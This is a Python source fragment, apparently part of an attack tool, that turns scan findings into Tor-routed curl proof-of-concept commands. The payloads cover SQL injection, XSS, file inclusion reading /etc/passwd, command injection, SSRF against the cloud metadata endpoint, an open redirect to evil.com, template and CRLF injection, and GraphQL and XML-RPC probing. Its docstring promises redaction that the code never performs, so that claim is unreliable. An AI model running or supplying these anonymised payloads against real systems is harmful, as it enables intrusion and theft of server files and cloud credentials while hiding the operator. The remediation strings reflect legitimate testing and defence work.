#  PoC Exporter — generate actionable exploit proof-of-concepts
# ══════════════════════════════════════════════════════════════════════════

class PoCExporter:
    """Export exploitable findings as actionable PoC commands.

    All exports are OPSEC-safe by default:
    - Cookies, auth headers, API keys redacted
    - All commands route through Tor (--socks5-hostname)
    - No real target identifiers in filenames
    """

    @staticmethod
    def export_finding(finding: dict, redact: bool = True) -> dict:
        """Export a single finding as multiple PoC formats.

        Uses _ACTIVE_TOR_PORT so curl commands match the operator's proxy.
        """
        ei = finding.get("exploit_info", {})
        exploit_type = ei.get("type", "unknown")
        param = ei.get("parameter", "")
        path = ei.get("path", "")
        sp = f"--socks5-hostname 127.0.0.1:{_ACTIVE_TOR_PORT}"

        poc = {
            "finding": finding.get("title", ""),
            "severity": finding.get("severity", ""),
            "confidence": finding.get("confidence", 0),
            "verified": finding.get("verified", "unverified"),
            "curl": "",
            "description": "",
            "remediation": "",
        }

        if exploit_type == "sqli" and param:
            poc["curl"] = f'curl {sp} "[TARGET_URL]?{param}=1\'"'
            poc["description"] = (
                f"SQL injection via '{param}' parameter. "
                f"Send a single quote to trigger SQL error messages."
            )
            poc["remediation"] = "Use parameterized queries / prepared statements."

        elif exploit_type == "xss" and param:
            poc["curl"] = f'curl {sp} "[TARGET_URL]?{param}=<script>alert(1)</script>"'
            poc["description"] = (
                f"Reflected XSS via '{param}' parameter. "
                f"HTML tags reflected unescaped in response."
            )
            poc["remediation"] = "HTML-encode all user input in output context."

        elif exploit_type == "lfi" and param:
            poc["curl"] = f'curl {sp} "[TARGET_URL]?{param}=..%2F..%2F..%2Fetc%2Fpasswd"'
            poc["description"] = (
                f"Local file inclusion via '{param}'. "
                f"Arbitrary server files readable."
            )
            poc["remediation"] = "Whitelist allowed file paths. Never pass user input to file operations."

        elif exploit_type == "command_injection" and param:
            poc["curl"] = f'curl {sp} "[TARGET_URL]?{param}=;id"'
            poc["description"] = (
                f"OS command injection via '{param}'. "
                f"Arbitrary commands execute on the server."
            )
            poc["remediation"] = "Never pass user input to shell commands. Use safe APIs."

        elif exploit_type == "ssrf" and param:
            poc["curl"] = (
                f'curl {sp} '
                f'"[TARGET_URL]?{param}=http://169.254.169.254/latest/meta-data/"'
            )
            poc["description"] = (
                f"SSRF via '{param}'. Server fetches attacker-controlled URLs."
            )
            poc["remediation"] = "Validate and whitelist allowed URL destinations."

        elif exploit_type == "graphql_introspection" and path:
            poc["curl"] = (
                f'curl {sp} '
                f'-X POST -H "Content-Type: application/json" '
                f'-d \'{{"query": "{{ __schema {{ types {{ name }} }} }}"}}\' '
                f'"[TARGET_URL]{path}"'
            )
            poc["description"] = "GraphQL introspection enabled. Full API schema exposed."
            poc["remediation"] = "Disable introspection in production."

        elif exploit_type == "subdomain_takeover":
            cname = ei.get("cname", "")
            service = ei.get("service", "")
            poc["curl"] = f"# Register unclaimed resource on {service} pointing to {cname}"
            poc["description"] = (
                f"CNAME points to unclaimed {service} resource. "
                f"Attacker can claim it and serve content on the subdomain."
            )
            poc["remediation"] = "Remove dangling CNAME record or claim the resource."

        elif exploit_type == "directory_traversal":
            poc["curl"] = f'curl {sp} "[TARGET_URL]/..%2F..%2F..%2F..%2Fetc%2Fpasswd"'
            poc["description"] = "Path traversal to read arbitrary server files."
            poc["remediation"] = "Validate file paths. Use chroot or whitelist allowed directories."

        elif exploit_type == "open_redirect" and param:
            poc["curl"] = f'curl -v {sp} "[TARGET_URL]?{param}=https://evil.com/"'
            poc["description"] = (
                f"Open redirect via '{param}'. Chain with OAuth for token theft."
            )
            poc["remediation"] = "Whitelist allowed redirect destinations."

        elif exploit_type == "xmlrpc_abuse":
            poc["curl"] = (
                f'curl {sp} -X POST '
                f'-H "Content-Type: text/xml" '
                f'-d \'<?xml version="1.0"?><methodCall><methodName>system.listMethods'
                f'</methodName></methodCall>\' "[TARGET_URL]/xmlrpc.php"'
            )
            poc["description"] = "WordPress XML-RPC is enabled. Enumerate methods, attempt brute-force."
            poc["remediation"] = "Disable XML-RPC or restrict access via .htaccess."

        elif exploit_type == "ssti" and param:
            poc["curl"] = f'curl {sp} "[TARGET_URL]?{param}={{{{7*7}}}}"'
            poc["description"] = (
                f"Server-Side Template Injection via '{param}'. "
                f"Template expressions are evaluated server-side."
            )
            poc["remediation"] = "Never render user input through template engines. Use sandboxed templates."

        elif exploit_type == "crlf" and param:
            poc["curl"] = f'curl -v {sp} "[TARGET_URL]?{param}=%0d%0aSet-Cookie:%20injected=1"'
            poc["description"] = (
                f"CRLF / HTTP header injection via '{param}'. "
                f"Attacker can inject arbitrary response headers."
            )
            poc["remediation"] = "Strip CR/LF characters from user input before use in headers."

        elif exploit_type == "graphql_data_exposure" and path:
            poc["curl"] = (
                f'curl {sp} '
                f'-X POST -H "Content-Type: application/json" '
                f'-d \'{{"query": "{{ __schema {{ types {{ name fields {{ name }} }} }} }}"}}\' '
                f'"[TARGET_URL]{path}"'
            )
            poc["description"] = "GraphQL schema exposes sensitive types/fields."
            poc["remediation"] = "Disable introspection. Implement field-level authorization."

        else:
            poc["curl"] = "# Manual verification required"
            poc["description"] = finding.get("detail", "")
            poc["remediation"] = "See finding detail."

        return poc

    @staticmethod
    def export_all(findings: List[dict], redact: bool = True) -> List[dict]:
        """Export all exploitable findings."""
        pocs = []
        for f in findings:
            if f.get("exploitable"):
                pocs.append(PoCExporter.export_finding(f, redact))
        return pocs


